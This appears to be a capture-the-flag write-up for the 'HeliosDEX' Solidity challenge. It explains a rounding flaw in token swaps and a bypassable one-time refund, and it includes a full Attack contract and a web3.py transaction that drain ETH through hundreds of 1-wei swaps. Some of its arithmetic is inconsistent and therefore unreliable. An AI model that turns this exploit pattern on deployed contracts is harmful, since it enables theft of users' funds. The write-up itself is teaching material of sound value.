
## Challenge Overview

The HeliosDEX challenge features a decentralized exchange that allows swapping ETH for various tokens (EldorionFang, MalakarEssence, and HeliosLuminaShards) and provides a one-time refund mechanism to convert tokens back to ETH.

To solve the challenge, we need to increase our ETH balance to at least 20 ETH (as defined in the `isSolved()` function in the Setup contract).

## Vulnerability Analysis

After analyzing the contracts, the key vulnerabilities are:

**Missing Address Validation**: The `oneTimeRefund()` function only checks if the caller has already received a refund, but not if the tokens were actually purchased by that caller. Combined with the fact that you can use a contract as an intermediary, this allows bypassing the one-time refund limitation.

```C#
function oneTimeRefund(address item, uint256 amount) external heliosGuardedTrade {
    require(!hasRefunded[msg.sender], "HeliosDEX: refund already bestowed upon thee");
    // ...
}
```

**Small Value Transactions**: By sending extremely small amounts of ETH (1 wei) when calling `swapForHLS()`, we can maximize the rounding discrepancy in our favor.

Rounding Up: Using Math.Rounding.Up, even 1 wei of ETH converts to 1 HLS due to rounding.

Fee Truncation: For small amounts (1 HLS), the 0.25% fee (0.0025 HLS) truncates to 0, giving a full 1 HLS per 1 wei.


## Exploitation Strategy

The strategy exploits the rounding discrepancy between buying and selling HLS tokens:

1. Create an attack contract that serves as our intermediary
2. Call `swapForHLS()` multiple times with minimal ETH value (1 wei per call)
3. Due to rounding, we receive more HLS tokens than the exchange calculation would yield for the aggregated amount
4. Approve the DEX to spend our HLS tokens
5. Call `oneTimeRefund()` to convert all HLS tokens back to ETH
6. Because of the rounding differences, we receive more ETH than we initially paid

### Mathematical Explanation

When swapping 1 wei for HLS tokens:
- Exchange ratio: 10 (exchangeRatioHLS)
- After subtracting the 0.25% fee, we still receive a disproportionately large amount

``
netEth = (amount * 1e18 / exchangeRatioHLS) * (1 - 25 / 10000)
``

When choose `amount = 300 ` we have ETH balance over 20 ETH, so get flag:
``
netEth = (300 * 1e18 / 10) * (1 - 25 / 10000) = 29.925 ETH
``


## Implementation Details

Our exploit contract (`Attack.sol`):

```C#
contract Attack {
    IHeliosDEX public immutable dex;
    IHeliosLuminaShards public immutable hls;
    address payable private owner;
    
    constructor(address dexAddress, address hlsAddress) {
        dex = IHeliosDEX(dexAddress);
        hls = IHeliosLuminaShards(hlsAddress);
        owner = payable(msg.sender);
    }
    
    function attack(uint256 times) external payable {
        require(msg.value == times * 1 wei, "Incorrect ETH");
        
        // Split into small chunks
        for(uint i=0; i<times; i++) {
            dex.swapForHLS{value: 1 wei}();
        }
        
        uint balance = hls.balanceOf(address(this));
        hls.approve(address(dex), balance);
        dex.oneTimeRefund(address(hls), balance);
        owner.transfer(address(this).balance);
    }
    
    receive() external payable {}
}
```
The attack function in the final contract automatically transfers ETH back to the player after the refund, ensuring the player's balance increases

## Execution Steps

1. Deploy the Attack contract with the HeliosDEX and HLS token addresses
2. Call the `attack()` function with 300 as the parameter and 300 wei as the value
3. The contract:
   - Calls `swapForHLS()` 300 times with 1 wei each time
   - Approves the DEX to spend its HLS tokens
   - Calls `oneTimeRefund()` to convert all HLS tokens back to ETH
   - Transfers the resulting ETH back to us
4. The final script set a 10 million gas limit for the exploit transaction, ensuring all swaps and refunds could be processed in a single transaction.
```py
tx = attacker.functions.attack(300).build_transaction({
    'value': 300,  # 300 wei for 300 swaps
    'gas': 10000000,
    'gasPrice': w3.eth.gas_price
})
```
See full exploit in `exploit.py`

## Result
![image](https://github.com/user-attachments/assets/7f4659fd-2e3c-4dc9-96c0-64fc13475261)
